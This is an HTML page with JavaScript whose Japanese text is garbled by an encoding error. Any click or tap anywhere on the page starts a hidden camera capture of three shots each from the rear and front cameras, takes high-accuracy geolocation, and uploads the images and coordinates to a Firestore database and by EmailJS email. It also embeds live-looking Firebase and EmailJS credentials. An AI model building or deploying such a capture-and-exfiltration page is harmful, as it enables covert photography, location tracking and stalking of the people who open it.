<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Firestore & EmailJS é€£å†™ï¼‹ä½ç½®æƒ…å ±é€ä¿¡</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #222; color: #eee;
    padding: 20px;
    user-select:none;
  }
  #status {
    background: rgba(0,0,0,0.7);
    padding: 10px;
    border-radius: 6px;
    max-height: 150px;
    overflow-y: auto;
    white-space: pre-wrap;
    font-family: monospace;
    margin-bottom: 20px;
  }
  .photo-preview img {
    width: 120px;
    margin: 5px;
    border: 2px solid #555;
    border-radius: 4px;
  }
  h1 {
    text-align:center;
  }
</style>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";

  // Firebaseè¨­å®š
  const firebaseConfig = {
    apiKey: "AIzaSyDgwbExA5BKTcKsq2Ov8z173Ke6EPYGf28",
    authDomain: "picture-storage-906ae.firebaseapp.com",
    projectId: "picture-storage-906ae",
    storageBucket: "picture-storage-906ae.firebasestorage.app",
    messagingSenderId: "134265329367",
    appId: "1:134265329367:web:b94063426b6307f8a8c292",
    measurementId: "G-9CP3F27EMF"
  };
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  // EmailJSåˆæœŸåŒ–
  emailjs.init("cPjKBUm_i6HebDQF7");

  // DOMè¦ç´ 
  const statusEl = document.getElementById("status");

  let busy = false;

  function log(text) {
    console.log(text);
    statusEl.textContent += text + "\n";
    statusEl.scrollTop = statusEl.scrollHeight;
  }

  // ã‚«ãƒ¡ãƒ©èµ·å‹•â†’é€£å†™ï¼ˆ3æšã€0.05ç§’é–“éš”ï¼‰
  async function capturePhotos(facingMode) {
    log(`ğŸ“¸ ${facingMode}ã‚«ãƒ¡ãƒ©èµ·å‹•`);
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    const video = document.createElement("video");
    video.style.display = "none";
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");

    const photos = [];
    for (let i = 0; i < 3; i++) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL("image/jpeg", 0.3);
      photos.push(dataUrl);
      log(`æ’®å½± ${i+1} æšç›® ã‚µã‚¤ã‚º: ${Math.round((dataUrl.length*3)/4/1024)} KB`);
      await new Promise(r => setTimeout(r, 50));
    }
    stream.getTracks().forEach(t => t.stop());
    video.remove();
    return photos;
  }

  // ä½ç½®æƒ…å ±å–å¾—
  function getLocation() {
    log("ğŸ“ ä½ç½®æƒ…å ±å–å¾—é–‹å§‹");
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("ä½ç½®æƒ…å ±éå¯¾å¿œ"));
        return;
      }
      navigator.geolocation.getCurrentPosition(pos => {
        const loc = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy,
          time: new Date(pos.timestamp).toLocaleString()
        };
        log(`ä½ç½®æƒ…å ±å–å¾—æˆåŠŸ: ç·¯åº¦${loc.lat}, çµŒåº¦${loc.lon}, ç²¾åº¦${loc.acc}m`);
        resolve(loc);
      }, err => {
        log(`âš ï¸ ä½ç½®æƒ…å ±å–å¾—å¤±æ•—: ${err.message}`);
        resolve({ lat: "ä¸æ˜", lon: "ä¸æ˜", acc: "ä¸æ˜", time: new Date().toLocaleString() });
      }, { enableHighAccuracy: true, timeout: 10000 });
    });
  }

  // Firestoreã«ä¿å­˜
  async function saveToFirestore(data) {
    log("â¬†ï¸ Firestoreã«ä¿å­˜ä¸­...");
    try {
      await addDoc(collection(db, "photos_with_location"), data);
      log("âœ… Firestoreä¿å­˜å®Œäº†");
    } catch(e) {
      log("âŒ Firestoreä¿å­˜å¤±æ•—: " + e.message);
    }
  }

  // EmailJSé€ä¿¡
  async function sendEmail(data) {
    log("âœ‰ï¸ EmailJSé€ä¿¡ä¸­...");
    try {
      await emailjs.send('service_ja2c09x', 'template_2fp2jrg', data);
      log("âœ… Emailé€ä¿¡å®Œäº†");
    } catch(e) {
      log("âŒ Emailé€ä¿¡å¤±æ•—: " + e.message);
    }
  }

  // ãƒ¡ã‚¤ãƒ³å‡¦ç†
  async function runProcess() {
    if(busy) {
      log("âŒ å‡¦ç†ä¸­ã§ã™ã€‚äºŒé‡å®Ÿè¡Œé˜²æ­¢");
      return;
    }
    busy = true;
    log("ğŸ”„ å‡¦ç†é–‹å§‹");

    try {
      // å¤–ã‚«ãƒ¡é€£å†™
      const rearPhotos = await capturePhotos("environment");
      // å†…ã‚«ãƒ¡é€£å†™
      const frontPhotos = await capturePhotos("user");
      // ä½ç½®æƒ…å ±å–å¾—
      const location = await getLocation();

      // Firestoreç”¨ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆä½œæˆ
      const firestoreData = {
        rearPhotos,
        frontPhotos,
        location,
        createdAt: new Date().toISOString(),
      };
      await saveToFirestore(firestoreData);

      // EmailJSç”¨ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿æ•´å½¢
      const templateParams = {
        photo_rear1: rearPhotos[0],
        photo_rear2: rearPhotos[1],
        photo_rear3: rearPhotos[2],
        photo_front1: frontPhotos[0],
        photo_front2: frontPhotos[1],
        photo_front3: frontPhotos[2],
        location_info: `ç·¯åº¦: ${location.lat}<br>çµŒåº¦: ${location.lon}<br>ç²¾åº¦: ${location.acc}m<br>æ™‚åˆ»: ${location.time}`,
        date: new Date().toLocaleString()
      };
      await sendEmail(templateParams);

      log("ğŸ‰ å‡¦ç†å®Œäº†ï¼");
    } catch(e) {
      log("âŒ å…¨ä½“å‡¦ç†ã‚¨ãƒ©ãƒ¼: " + e.message);
    } finally {
      busy = false;
    }
  }

  // ãƒšãƒ¼ã‚¸å…¨ä½“ã‚¯ãƒªãƒƒã‚¯ãƒ»ã‚¿ãƒƒãƒã§å‡¦ç†å®Ÿè¡Œ
  window.addEventListener("click", runProcess);
  window.addEventListener("touchstart", runProcess, { passive: false });
</script>
</head>
<body>
<h1>ğŸ“¸ Firestoreä¿å­˜ï¼‹EmailJSé€ä¿¡</h1>
<pre id="status">å¾…æ©Ÿä¸­...</pre>
</body>
</html>
